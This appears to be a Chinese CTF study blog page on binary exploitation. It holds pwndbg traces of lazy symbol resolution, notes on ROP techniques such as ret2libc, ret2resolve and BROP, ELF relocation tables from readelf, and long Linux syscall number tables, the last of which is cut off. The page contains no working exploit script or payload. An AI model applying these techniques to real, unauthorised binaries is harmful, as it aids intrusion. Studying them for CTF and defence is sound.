EIP 0xf7fea340 (_dl_runtime_resolve) ◂— push eax─────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────────── 0x80483a0 &lt;read@plt&gt; jmp dword ptr [_GLOBAL_OFFSET_TABLE_+16] &lt;0x804a010&gt; 0x80483a6 &lt;read@plt+6&gt; push 8 0x80483ab &lt;read@plt+11&gt; jmp 0x8048380 ↓ 0x8048380 push dword ptr [_GLOBAL_OFFSET_TABLE_+4] &lt;0x804a004&gt; 0x8048386 jmp dword ptr [0x804a008] &lt;0xf7fea340&gt; ↓ ► 0xf7fea340 &lt;_dl_runtime_resolve&gt; push eax 0xf7fea341 &lt;_dl_runtime_resolve+1&gt; push ecx 0xf7fea342 &lt;_dl_runtime_resolve+2&gt; push edx 0xf7fea343 &lt;_dl_runtime_resolve+3&gt; mov edx, dword ptr [esp + 0x10] 0xf7fea347 &lt;_dl_runtime_resolve+7&gt; mov eax, dword ptr [esp + 0xc] 0xf7fea34b &lt;_dl_runtime_resolve+11&gt; call _dl_fixup &lt;0xf7fe44f0&gt;─────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────00:0000│ esp 0xffffd084 —▸ 0xf7ffd940 ◂— 0x001:0004│ 0xffffd088 ◂— 0x802:0008│ 0xffffd08c —▸ 0x8048519 (vuln+46) ◂— add esp, 0x1003:000c│ 0xffffd090 ◂— 0x004:0010│ 0xffffd094 —▸ 0xffffd0ac ◂— 0x105:0014│ 0xffffd098 ◂— 0x10006:0018│ 0xffffd09c —▸ 0xf7ffd940 ◂— 0x007:001c│ 0xffffd0a0 —▸ 0xffffd0d4 —▸ 0xf7ddf728 ◂— 0x147a───────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────── ► f 0 f7fea340 _dl_runtime_resolve f 1 8048519 vuln+46 f 2 80485a7 main+136 f 3 f7deb9a1 __libc_start_main+241pwndbg&gt; b *0xf7fea350Breakpoint 3 at 0xf7fea350: file ../sysdeps/i386/dl-trampoline.S, line 44.pwndbg&gt; cContinuing.LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA───────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────────────────────── EAX 0xf7ffd940 ◂— 0x0 EBX 0x0 ECX 0xffffd0ac ◂— 0x1 EDX 0x8 EDI 0xffffd190 —▸ 0xffffd1b0 ◂— 0x1 ESI 0xf7fa8000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d5d8c EBP 0xffffd118 —▸ 0xffffd198 ◂— 0x0 ESP 0xffffd078 —▸ 0xf7fa989c (_IO_stdfile_0_lock) ◂— 0x0 EIP 0xf7fea34b (_dl_runtime_resolve+11) —▸ 0xffa1a0e8 ◂— 0xffa1a0e8─────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────────── 0xf7fea340 &lt;_dl_runtime_resolve&gt; push eax 0xf7fea341 &lt;_dl_runtime_resolve+1&gt; push ecx 0xf7fea342 &lt;_dl_runtime_resolve+2&gt; push edx 0xf7fea343 &lt;_dl_runtime_resolve+3&gt; mov edx, dword ptr [esp + 0x10] 0xf7fea347 &lt;_dl_runtime_resolve+7&gt; mov eax, dword ptr [esp + 0xc] ► 0xf7fea34b &lt;_dl_runtime_resolve+11&gt; call _dl_fixup &lt;0xf7fe44f0&gt; arg[0]: 0xf7fa989c (_IO_stdfile_0_lock) ◂— 0x0 arg[1]: 0xffffd0ac ◂— 0x1 0xf7fea350 &lt;_dl_runtime_resolve+16&gt; pop edx 0xf7fea351 &lt;_dl_runtime_resolve+17&gt; mov ecx, dword ptr [esp] 0xf7fea354 &lt;_dl_runtime_resolve+20&gt; mov dword ptr [esp], eax 0xf7fea357 &lt;_dl_runtime_resolve+23&gt; mov eax, dword ptr [esp + 4] 0xf7fea35b &lt;_dl_runtime_resolve+27&gt; ret 0xc─────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────00:0000│ esp 0xffffd078 —▸ 0xf7fa989c (_IO_stdfile_0_lock) ◂— 0x001:0004│ 0xffffd07c —▸ 0xffffd0ac ◂— 0x1... ↓03:000c│ 0xffffd084 —▸ 0xf7ffd940 ◂— 0x004:0010│ 0xffffd088 ◂— 0x805:0014│ 0xffffd08c —▸ 0x8048519 (vuln+46) ◂— add esp, 0x1006:0018│ 0xffffd090 ◂— 0x007:001c│ 0xffffd094 —▸ 0xffffd0ac ◂— 0x1───────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────── ► f 0 f7fea350 _dl_runtime_resolve+16 f 1 8048519 vuln+46 f 2 80485a7 main+136 f 3 f7deb9a1 __libc_start_main+241Breakpoint 3, _dl_runtime_resolve () at ../sysdeps/i386/dl-trampoline.S:4444 in ../sysdeps/i386/dl-trampoline.SLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA───────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────────────────────── EAX 0xf7eb8470 (read) ◂— push esi EBX 0x0 ECX 0xf7dd9eb8 ◂— 0x21b2 EDX 0x0 EDI 0xffffd190 —▸ 0xffffd1b0 ◂— 0x1 ESI 0xf7fa8000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d5d8c EBP 0xffffd118 —▸ 0xffffd198 ◂— 0x0 ESP 0xffffd078 —▸ 0xf7fa989c (_IO_stdfile_0_lock) ◂— 0x0 EIP 0xf7fea350 (_dl_runtime_resolve+16) ◂— pop edx─────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────────── 0xf7fea341 &lt;_dl_runtime_resolve+1&gt; push ecx 0xf7fea342 &lt;_dl_runtime_resolve+2&gt; push edx 0xf7fea343 &lt;_dl_runtime_resolve+3&gt; mov edx, dword ptr [esp + 0x10] 0xf7fea347 &lt;_dl_runtime_resolve+7&gt; mov eax, dword ptr [esp + 0xc] 0xf7fea34b &lt;_dl_runtime_resolve+11&gt; call _dl_fixup &lt;0xf7fe44f0&gt; ► 0xf7fea350 &lt;_dl_runtime_resolve+16&gt; pop edx 0xf7fea351 &lt;_dl_runtime_resolve+17&gt; mov ecx, dword ptr [esp] 0xf7fea354 &lt;_dl_runtime_resolve+20&gt; mov dword ptr [esp], eax 0xf7fea357 &lt;_dl_runtime_resolve+23&gt; mov eax, dword ptr [esp + 4] 0xf7fea35b &lt;_dl_runtime_resolve+27&gt; ret 0xc ↓ 0xf7eb8470 &lt;read&gt; push esi─────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────00:0000│ esp 0xffffd078 —▸ 0xf7fa989c (_IO_stdfile_0_lock) ◂— 0x001:0004│ 0xffffd07c —▸ 0xffffd0ac ◂— 0x1... ↓03:000c│ 0xffffd084 —▸ 0xf7ffd940 ◂— 0x004:0010│ 0xffffd088 ◂— 0x805:0014│ 0xffffd08c —▸ 0x8048519 (vuln+46) ◂— add esp, 0x1006:0018│ 0xffffd090 ◂— 0x007:001c│ 0xffffd094 —▸ 0xffffd0ac ◂— 0x1───────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────── ► f 0 f7fea350 _dl_runtime_resolve+16 f 1 8048519 vuln+46 f 2 80485a7 main+136 f 3 f7deb9a1 __libc_start_main+241Breakpoint *0xf7fea350pwndbg&gt; x/xw 0x8048a0100x8048a010: Cannot access memory at address 0x8048a010pwndbg&gt; x/xw 0x804a0100x804a010: 0xf7eb8470pwndbg&gt; c......pwndbg&gt; siLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA───────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────────────────────── EAX 0xffffd0ac ◂— 0x1 EBX 0x0 ECX 0xffffd0ac ◂— 0x1 EDX 0xf7fa989c (_IO_stdfile_0_lock) ◂— 0x0 EDI 0xffffd190 —▸ 0xffffd1b0 ◂— 0x1 ESI 0xf7fa8000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d5d8c EBP 0xffffd118 —▸ 0xffffd198 ◂— 0x0 ESP 0xffffd07c —▸ 0xf7eb8470 (read) ◂— push esi EIP 0xf7fea35b (_dl_runtime_resolve+27) ◂— ret 0xc─────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────────── 0xf7fea34b &lt;_dl_runtime_resolve+11&gt; call _dl_fixup &lt;0xf7fe44f0&gt; 0xf7fea350 &lt;_dl_runtime_resolve+16&gt; pop edx 0xf7fea351 &lt;_dl_runtime_resolve+17&gt; mov ecx, dword ptr [esp] 0xf7fea354 &lt;_dl_runtime_resolve+20&gt; mov dword ptr [esp], eax 0xf7fea357 &lt;_dl_runtime_resolve+23&gt; mov eax, dword ptr [esp + 4] ► 0xf7fea35b &lt;_dl_runtime_resolve+27&gt; ret 0xc ↓ 0xf7eb8470 &lt;read&gt; push esi 0xf7eb8471 &lt;read+1&gt; push ebx 0xf7eb8472 &lt;read+2&gt; sub esp, 0x14 0xf7eb8475 &lt;read+5&gt; mov ebx, dword ptr [esp + 0x20] 0xf7eb8479 &lt;read+9&gt; mov ecx, dword ptr [esp + 0x24]─────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────00:0000│ esp 0xffffd07c —▸ 0xf7eb8470 (read) ◂— push esi01:0004│ 0xffffd080 —▸ 0xffffd0ac ◂— 0x102:0008│ 0xffffd084 —▸ 0xf7ffd940 ◂— 0x003:000c│ 0xffffd088 ◂— 0x804:0010│ 0xffffd08c —▸ 0x8048519 (vuln+46) ◂— add esp, 0x1005:0014│ 0xffffd090 ◂— 0x006:0018│ 0xffffd094 —▸ 0xffffd0ac ◂— 0x107:001c│ 0xffffd098 ◂— 0x100───────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────── ► f 0 f7eb8470 read f 1 8048519 vuln+46 f 2 80485a7 main+136 f 3 f7deb9a1 __libc_start_main+241__GI___libc_read (fd=0x0, buf=0xffffd0ac, nbytes=0x100) at ../sysdeps/unix/sysv/linux/read.c:2626 ../sysdeps/unix/sysv/linux/read.c: No such file or directory.LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA───────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────────────────────── EAX 0xffffd0ac ◂— 0x1 EBX 0x0 ECX 0xffffd0ac ◂— 0x1 EDX 0xf7fa989c (_IO_stdfile_0_lock) ◂— 0x0 EDI 0xffffd190 —▸ 0xffffd1b0 ◂— 0x1 ESI 0xf7fa8000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d5d8c EBP 0xffffd118 —▸ 0xffffd198 ◂— 0x0 ESP 0xffffd08c —▸ 0x8048519 (vuln+46) ◂— add esp, 0x10 EIP 0xf7eb8470 (read) ◂— push esi─────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────────── ► 0xf7eb8470 &lt;read&gt; push esi 0xf7eb8471 &lt;read+1&gt; push ebx 0xf7eb8472 &lt;read+2&gt; sub esp, 0x14 0xf7eb8475 &lt;read+5&gt; mov ebx, dword ptr [esp + 0x20] 0xf7eb8479 &lt;read+9&gt; mov ecx, dword ptr [esp + 0x24] 0xf7eb847d &lt;read+13&gt; mov edx, dword ptr [esp + 0x28] 0xf7eb8481 &lt;read+17&gt; mov eax, dword ptr gs:[0xc] 0xf7eb8487 &lt;read+23&gt; test eax, eax 0xf7eb8489 &lt;read+25&gt; jne read+56 &lt;0xf7eb84a8&gt; ↓ 0xf7eb84a8 &lt;read+56&gt; mov dword ptr [esp + 0xc], edx 0xf7eb84ac &lt;read+60&gt; mov dword ptr [esp + 8], ecx─────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────00:0000│ esp 0xffffd08c —▸ 0x8048519 (vuln+46) ◂— add esp, 0x1001:0004│ 0xffffd090 ◂— 0x002:0008│ 0xffffd094 —▸ 0xffffd0ac ◂— 0x103:000c│ 0xffffd098 ◂— 0x10004:0010│ 0xffffd09c —▸ 0xf7ffd940 ◂— 0x005:0014│ 0xffffd0a0 —▸ 0xffffd0d4 —▸ 0xf7ddf728 ◂— 0x147a06:0018│ 0xffffd0a4 —▸ 0xf7ffdaf8 —▸ 0xf7ffda9c —▸ 0xf7fce3e0 —▸ 0xf7ffd940 ◂— ...07:001c│ 0xffffd0a8 —▸ 0xf7fce410 —▸ 0x80482d9 ◂— inc edi /* &apos;GLIBC_2.0&apos; */───────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────── ► f 0 f7eb8470 read f 1 8048519 vuln+46 f 2 80485a7 main+136 f 3 f7deb9a1 __libc_start_main+241pwndbg&gt; ROP(Return Oriented Programming)参考链接：https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/basic_rop/ 按照ctf_wiki上的顺序,逐步深入的学习 基本ROP ret2text,ret2syscall,ret2shellcode,ret2libc 可以参考天舒的：https://blog.csdn.net/weixin_40850881/article/details/80216764 我自己的博客： ret2resolve使用readelf查看动态段 .dynamic 的信息 12345678910111213141516171819202122232425262728root@kali:~/Desktop/ret2resolve# readelf -d babystackDynamic section at offset 0xf14 contains 24 entries: Tag Type Name/Value 0x00000001 (NEEDED) Shared library: [libc.so.6] 0x0000000c (INIT) 0x80482c8 0x0000000d (FINI) 0x80484f4 0x00000019 (INIT_ARRAY) 0x8049f08 0x0000001b (INIT_ARRAYSZ) 4 (bytes) 0x0000001a (FINI_ARRAY) 0x8049f0c 0x0000001c (FINI_ARRAYSZ) 4 (bytes) 0x6ffffef5 (GNU_HASH) 0x80481ac 0x00000005 (STRTAB) 0x804822c 0x00000006 (SYMTAB) 0x80481cc 0x0000000a (STRSZ) 80 (bytes) 0x0000000b (SYMENT) 16 (bytes) 0x00000015 (DEBUG) 0x0 0x00000003 (PLTGOT) 0x804a000 0x00000002 (PLTRELSZ) 24 (bytes) 0x00000014 (PLTREL) REL 0x00000017 (JMPREL) 0x80482b0 0x00000011 (REL) 0x80482a8 0x00000012 (RELSZ) 8 (bytes) 0x00000013 (RELENT) 8 (bytes) 0x6ffffffe (VERNEED) 0x8048288 0x6fffffff (VERNEEDNUM) 1 0x6ffffff0 (VERSYM) 0x804827c 0x00000000 (NULL) 0x0 JMPREL中保存的是.rel.plt表中的信息 10x00000017 (JMPREL) 0x80482b0 PLTRELSZ是.rel.plt表的大小为24字节 10x00000002 (PLTRELSZ) 24 (bytes) RELENT为每个.rel.plt表项的大小为8字节 10x00000013 (RELENT) 8 (bytes) 这些表项为ELF32_Rel类型的数据结构。其中r_offset是该函数在got表中的位置，r_info为其类型和符号序号。 123456789typedef uint32_t Elf32_Addr;typedef uint32_t Elf32_Word;typedef struct&#123; Elf32_Addr r_offset; /* Address */ Elf32_Word r_info; /* Relocation type and symbol index */&#125; Elf32_Rel;#define ELF32_R_SYM(val) ((val) &gt;&gt; 8)#define ELF32_R_TYPE(val) ((val) &amp; 0xff) 查看 .rel.plt 表中的信息，使用命令readelf -r babystack 1234567891011root@kali:~/Desktop/ret2resolve# readelf -r babystackRelocation section '.rel.dyn' at offset 0x2a8 contains 1 entry: Offset Info Type Sym.Value Sym. Name08049ffc 00000306 R_386_GLOB_DAT 00000000 __gmon_start__Relocation section '.rel.plt' at offset 0x2b0 contains 3 entries: Offset Info Type Sym.Value Sym. Name0804a00c 00000107 R_386_JUMP_SLOT 00000000 read@GLIBC_2.00804a010 00000207 R_386_JUMP_SLOT 00000000 alarm@GLIBC_2.00804a014 00000407 R_386_JUMP_SLOT 00000000 __libc_start_main@GLIBC_2.0 r_info为0x107，其中1表示read在符号表SYMTAB中的偏移为1,7表示为R_386_JUMP_SLOT类型，这一项用于检查，保持为7即可。我们前面看到的函数字符串就是通过在SYMTAB中的偏移来找到的。 12345678910111213gef➤ x/30i read 0x8048300 &lt;read@plt&gt;: jmp DWORD PTR ds:0x804a00c 0x8048306 &lt;read@plt+6&gt;: push 0x0 0x804830b &lt;read@plt+11&gt;: jmp 0x80482f0 0x8048310 &lt;alarm@plt&gt;: jmp DWORD PTR ds:0x804a010 0x8048316 &lt;alarm@plt+6&gt;: push 0x8 0x804831b &lt;alarm@plt+11&gt;: jmp 0x80482f0 0x8048320 &lt;__libc_start_main@plt&gt;: jmp DWORD PTR ds:0x804a014 0x8048326 &lt;__libc_start_main@plt+6&gt;: push 0x10 0x804832b &lt;__libc_start_main@plt+11&gt;: jmp 0x80482f0 0x8048330 &lt;__gmon_start__@plt&gt;: jmp DWORD PTR ds:0x8049ffc 0x8048336 &lt;__gmon_start__@plt+6&gt;: xchg ax,ax 0x8048338: Cannot access memory at address 0x8048338 中级ROP ret2__libc_csu_init 参考我的博客：https://blog.csdn.net/aptx4869_li/article/details/81322632 BROP 详细内容参见ctf-wiki上的讲解，关于这种利用方式的脚本的理解在我自己做题时的哪个脚本里面 高级ROP堆溢出利用 什么是堆： 堆可以提供动态分配的内存，允许程序申请大小未知的内存。堆其实就是程序虚拟地址空间的一块连续的线性区域，它由低地址向高地址方向增长。对于不同的应用来说，由于内存的需求各不相同等特性，因此目前堆的实现有很多种，具体如下 只有当真正访问一个地址的时候，系统才会建立虚拟页面与物理页面的映射关系。 12345dlmalloc – General purpose allocatorptmalloc2 – glibcjemalloc – FreeBSD and Firefoxtcmalloc – Googlelibumem – Solaris 系统函数调用号：32位ifndef _ASM_X86_UNISTD_32_H#define _ASM_X86_UNISTD_32_H 1#define __NR_restart_syscall 0#define __NR_exit 1#define __NR_fork 2#define __NR_read 3#define __NR_write 4#define __NR_open 5#define __NR_close 6#define __NR_waitpid 7#define __NR_creat 8#define __NR_link 9#define __NR_unlink 10#define __NR_execve 11#define __NR_chdir 12#define __NR_time 13#define __NR_mknod 14#define __NR_chmod 15#define __NR_lchown 16#define __NR_break 17#define __NR_oldstat 18#define __NR_lseek 19#define __NR_getpid 20#define __NR_mount 21#define __NR_umount 22#define __NR_setuid 23#define __NR_getuid 24#define __NR_stime 25#define __NR_ptrace 26#define __NR_alarm 27#define __NR_oldfstat 28#define __NR_pause 29#define __NR_utime 30#define __NR_stty 31#define __NR_gtty 32#define __NR_access 33#define __NR_nice 34#define __NR_ftime 35#define __NR_sync 36#define __NR_kill 37#define __NR_rename 38#define __NR_mkdir 39#define __NR_rmdir 40#define __NR_dup 41#define __NR_pipe 42#define __NR_times 43#define __NR_prof 44#define __NR_brk 45#define __NR_setgid 46#define __NR_getgid 47#define __NR_signal 48#define __NR_geteuid 49#define __NR_getegid 50#define __NR_acct 51#define __NR_umount2 52#define __NR_lock 53#define __NR_ioctl 54#define __NR_fcntl 55#define __NR_mpx 56#define __NR_setpgid 57#define __NR_ulimit 58#define __NR_oldolduname 59#define __NR_umask 60#define __NR_chroot 61#define __NR_ustat 62#define __NR_dup2 63#define __NR_getppid 64#define __NR_getpgrp 65#define __NR_setsid 66#define __NR_sigaction 67#define __NR_sgetmask 68#define __NR_ssetmask 69#define __NR_setreuid 70#define __NR_setregid 71#define __NR_sigsuspend 72#define __NR_sigpending 73#define __NR_sethostname 74#define __NR_setrlimit 75#define __NR_getrlimit 76#define __NR_getrusage 77#define __NR_gettimeofday 78#define __NR_settimeofday 79#define __NR_getgroups 80#define __NR_setgroups 81#define __NR_select 82#define __NR_symlink 83#define __NR_oldlstat 84#define __NR_readlink 85#define __NR_uselib 86#define __NR_swapon 87#define __NR_reboot 88#define __NR_readdir 89#define __NR_mmap 90#define __NR_munmap 91#define __NR_truncate 92#define __NR_ftruncate 93#define __NR_fchmod 94#define __NR_fchown 95#define __NR_getpriority 96#define __NR_setpriority 97#define __NR_profil 98#define __NR_statfs 99#define __NR_fstatfs 100#define __NR_ioperm 101#define __NR_socketcall 102#define __NR_syslog 103#define __NR_setitimer 104#define __NR_getitimer 105#define __NR_stat 106#define __NR_lstat 107#define __NR_fstat 108#define __NR_olduname 109#define __NR_iopl 110#define __NR_vhangup 111#define __NR_idle 112#define __NR_vm86old 113#define __NR_wait4 114#define __NR_swapoff 115#define __NR_sysinfo 116#define __NR_ipc 117#define __NR_fsync 118#define __NR_sigreturn 119#define __NR_clone 120#define __NR_setdomainname 121#define __NR_uname 122#define __NR_modify_ldt 123#define __NR_adjtimex 124#define __NR_mprotect 125#define __NR_sigprocmask 126#define __NR_create_module 127#define __NR_init_module 128#define __NR_delete_module 129#define __NR_get_kernel_syms 130#define __NR_quotactl 131#define __NR_getpgid 132#define __NR_fchdir 133#define __NR_bdflush 134#define __NR_sysfs 135#define __NR_personality 136#define __NR_afs_syscall 137#define __NR_setfsuid 138#define __NR_setfsgid 139#define __NR__llseek 140#define __NR_getdents 141#define __NR__newselect 142#define __NR_flock 143#define __NR_msync 144#define __NR_readv 145#define __NR_writev 146#define __NR_getsid 147#define __NR_fdatasync 148#define __NR__sysctl 149#define __NR_mlock 150#define __NR_munlock 151#define __NR_mlockall 152#define __NR_munlockall 153#define __NR_sched_setparam 154#define __NR_sched_getparam 155#define __NR_sched_setscheduler 156#define __NR_sched_getscheduler 157#define __NR_sched_yield 158#define __NR_sched_get_priority_max 159#define __NR_sched_get_priority_min 160#define __NR_sched_rr_get_interval 161#define __NR_nanosleep 162#define __NR_mremap 163#define __NR_setresuid 164#define __NR_getresuid 165#define __NR_vm86 166#define __NR_query_module 167#define __NR_poll 168#define __NR_nfsservctl 169#define __NR_setresgid 170#define __NR_getresgid 171#define __NR_prctl 172#define __NR_rt_sigreturn 173#define __NR_rt_sigaction 174#define __NR_rt_sigprocmask 175#define __NR_rt_sigpending 176#define __NR_rt_sigtimedwait 177#define __NR_rt_sigqueueinfo 178#define __NR_rt_sigsuspend 179#define __NR_pread64 180#define __NR_pwrite64 181#define __NR_chown 182#define __NR_getcwd 183#define __NR_capget 184#define __NR_capset 185#define __NR_sigaltstack 186#define __NR_sendfile 187#define __NR_getpmsg 188#define __NR_putpmsg 189#define __NR_vfork 190#define __NR_ugetrlimit 191#define __NR_mmap2 192#define __NR_truncate64 193#define __NR_ftruncate64 194#define __NR_stat64 195#define __NR_lstat64 196#define __NR_fstat64 197#define __NR_lchown32 198#define __NR_getuid32 199#define __NR_getgid32 200#define __NR_geteuid32 201#define __NR_getegid32 202#define __NR_setreuid32 203#define __NR_setregid32 204#define __NR_getgroups32 205#define __NR_setgroups32 206#define __NR_fchown32 207#define __NR_setresuid32 208#define __NR_getresuid32 209#define __NR_setresgid32 210#define __NR_getresgid32 211#define __NR_chown32 212#define __NR_setuid32 213#define __NR_setgid32 214#define __NR_setfsuid32 215#define __NR_setfsgid32 216#define __NR_pivot_root 217#define __NR_mincore 218#define __NR_madvise 219#define __NR_getdents64 220#define __NR_fcntl64 221#define __NR_gettid 224#define __NR_readahead 225#define __NR_setxattr 226#define __NR_lsetxattr 227#define __NR_fsetxattr 228#define __NR_getxattr 229#define __NR_lgetxattr 230#define __NR_fgetxattr 231#define __NR_listxattr 232#define __NR_llistxattr 233#define __NR_flistxattr 234#define __NR_removexattr 235#define __NR_lremovexattr 236#define __NR_fremovexattr 237#define __NR_tkill 238#define __NR_sendfile64 239#define __NR_futex 240#define __NR_sched_setaffinity 241#define __NR_sched_getaffinity 242#define __NR_set_thread_area 243#define __NR_get_thread_area 244#define __NR_io_setup 245#define __NR_io_destroy 246#define __NR_io_getevents 247#define __NR_io_submit 248#define __NR_io_cancel 249#define __NR_fadvise64 250#define __NR_exit_group 252#define __NR_lookup_dcookie 253#define __NR_epoll_create 254#define __NR_epoll_ctl 255#define __NR_epoll_wait 256#define __NR_remap_file_pages 257#define __NR_set_tid_address 258#define __NR_timer_create 259#define __NR_timer_settime 260#define __NR_timer_gettime 261#define __NR_timer_getoverrun 262#define __NR_timer_delete 263#define __NR_clock_settime 264#define __NR_clock_gettime 265#define __NR_clock_getres 266#define __NR_clock_nanosleep 267#define __NR_statfs64 268#define __NR_fstatfs64 269#define __NR_tgkill 270#define __NR_utimes 271#define __NR_fadvise64_64 272#define __NR_vserver 273#define __NR_mbind 274#define __NR_get_mempolicy 275#define __NR_set_mempolicy 276#define __NR_mq_open 277#define __NR_mq_unlink 278#define __NR_mq_timedsend 279#define __NR_mq_timedreceive 280#define __NR_mq_notify 281#define __NR_mq_getsetattr 282#define __NR_kexec_load 283#define __NR_waitid 284#define __NR_add_key 286#define __NR_request_key 287#define __NR_keyctl 288#define __NR_ioprio_set 289#define __NR_ioprio_get 290#define __NR_inotify_init 291#define __NR_inotify_add_watch 292#define __NR_inotify_rm_watch 293#define __NR_migrate_pages 294#define __NR_openat 295#define __NR_mkdirat 296#define __NR_mknodat 297#define __NR_fchownat 298#define __NR_futimesat 299#define __NR_fstatat64 300#define __NR_unlinkat 301#define __NR_renameat 302#define __NR_linkat 303#define __NR_symlinkat 304#define __NR_readlinkat 305#define __NR_fchmodat 306#define __NR_faccessat 307#define __NR_pselect6 308#define __NR_ppoll 309#define __NR_unshare 310#define __NR_set_robust_list 311#define __NR_get_robust_list 312#define __NR_splice 313#define __NR_sync_file_range 314#define __NR_tee 315#define __NR_vmsplice 316#define __NR_move_pages 317#define __NR_getcpu 318#define __NR_epoll_pwait 319#define __NR_utimensat 320#define __NR_signalfd 321#define __NR_timerfd_create 322#define __NR_eventfd 323#define __NR_fallocate 324#define __NR_timerfd_settime 325#define __NR_timerfd_gettime 326#define __NR_signalfd4 327#define __NR_eventfd2 328#define __NR_epoll_create1 329#define __NR_dup3 330#define __NR_pipe2 331#define __NR_inotify_init1 332#define __NR_preadv 333#define __NR_pwritev 334#define __NR_rt_tgsigqueueinfo 335#define __NR_perf_event_open 336#define __NR_recvmmsg 337#define __NR_fanotify_init 338#define __NR_fanotify_mark 339#define __NR_prlimit64 340#define __NR_name_to_handle_at 341#define __NR_open_by_handle_at 342#define __NR_clock_adjtime 343#define __NR_syncfs 344#define __NR_sendmmsg 345#define __NR_setns 346#define __NR_process_vm_readv 347#define __NR_process_vm_writev 348#define __NR_kcmp 349#define __NR_finit_module 350#define __NR_sched_setattr 351#define __NR_sched_getattr 352#define __NR_renameat2 353#define __NR_seccomp 354#define __NR_getrandom 355#define __NR_memfd_create 356#define __NR_bpf 357#define __NR_execveat 358#define __NR_socket 359#define __NR_socketpair 360#define __NR_bind 361#define __NR_connect 362#define __NR_listen 363#define __NR_accept4 364#define __NR_getsockopt 365#define __NR_setsockopt 366#define __NR_getsockname 367#define __NR_getpeername 368#define __NR_sendto 369#define __NR_sendmsg 370#define __NR_recvfrom 371#define __NR_recvmsg 372#define __NR_shutdown 373#define __NR_userfaultfd 374#define __NR_membarrier 375#define __NR_mlock2 376#define __NR_copy_file_range 377#define __NR_preadv2 378#define __NR_pwritev2 379#endif /* _ASM_X86_UNISTD_32_H */ 64位123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334#ifndef _ASM_X86_UNISTD_64_H#define _ASM_X86_UNISTD_64_H 1#define __NR_read 0#define __NR_write 1#define __NR_open 2#define __NR_close 3#define __NR_stat 4#define __NR_fstat 5#define __NR_lstat 6#define __NR_poll 7#define __NR_lseek 8#define __NR_mmap 9#define __NR_mprotect 10#define __NR_munmap 11#define __NR_brk 12#define __NR_rt_sigaction 13#define __NR_rt_sigprocmask 14#define __NR_rt_sigreturn 15#define __NR_ioctl 16#define __NR_pread64 17#define __NR_pwrite64 18#define __NR_readv 19#define __NR_writev 20#define __NR_access 21#define __NR_pipe 22#define __NR_select 23#define __NR_sched_yield 24#define __NR_mremap 25#define __NR_msync 26#define __NR_mincore 27#define __NR_madvise 28#define __NR_shmget 29#define __NR_shmat 30#define __NR_shmctl 31#define __NR_dup 32#define __NR_dup2 33#define __NR_pause 34#define __NR_nanosleep 35#define __NR_getitimer 36#define __NR_alarm 37#define __NR_setitimer 38#define __NR_getpid 39#define __NR_sendfile 40#define __NR_socket 41#define __NR_connect 42#define __NR_accept 43#define __NR_sendto 44#define __NR_recvfrom 45#define __NR_sendmsg 46#define __NR_recvmsg 47#define __NR_shutdown 48#define __NR_bind 49#define __NR_listen 50#define __NR_getsockname 51#define __NR_getpeername 52#define __NR_socketpair 53#define __NR_setsockopt 54#define __NR_getsockopt 55#define __NR_clone 56#define __NR_fork 57#define __NR_vfork 58#define __NR_execve 59#define __NR_exit 60#define __NR_wait4 61#define __NR_kill 62#define __NR_uname 63#define __NR_semget 64#define __NR_semop 65#define __NR_semctl 66#define __NR_shmdt 67#define __NR_msgget 68#define __NR_msgsnd 69#define __NR_msgrcv 70#define __NR_msgctl 71#define __NR_fcntl 72#define __NR_flock 73#define __NR_fsync 74#define __NR_fdatasync 75#define __NR_truncate 76#define __NR_ftruncate 77#define __NR_getdents 78#define __NR_getcwd 79#define __NR_chdir 80#define __NR_fchdir 81#define __NR_rename 82#define __NR_mkdir 83#define __NR_rmdir 84#define __NR_creat 85#define __NR_link 86#define __NR_unlink 87#define __NR_symlink 88#define __NR_readlink 89#define __NR_chmod 90#define 